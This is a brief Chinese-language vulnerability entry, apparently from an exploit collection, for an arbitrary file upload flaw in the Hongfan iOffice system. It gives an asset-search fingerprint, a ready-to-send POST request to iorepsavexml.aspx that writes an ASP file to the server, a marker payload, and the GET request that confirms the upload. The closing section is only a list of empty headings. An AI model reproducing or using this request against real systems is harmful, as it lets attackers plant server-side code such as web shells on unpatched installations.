# 红帆iOfficeiorepsavexml存在任意文件上传漏洞

- **系统**：红帆　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="红帆 iOffice"`
- **请求**：`POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=1.asp&filepath=/upfiles/rep/pic/ HTTP/1.1`
- **关键头**：`Content-Length: 6`

**请求体 / payload**
```
<% response.write("drwc2nymcirgr7r2bdgb")%>

上传文件位置
GET /iOffice/upfiles/rep/pic/1.asp HTTP/1.1
Host:
```

**其他**
- 红帆iOffice iorepsavexml存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 红帆iOffice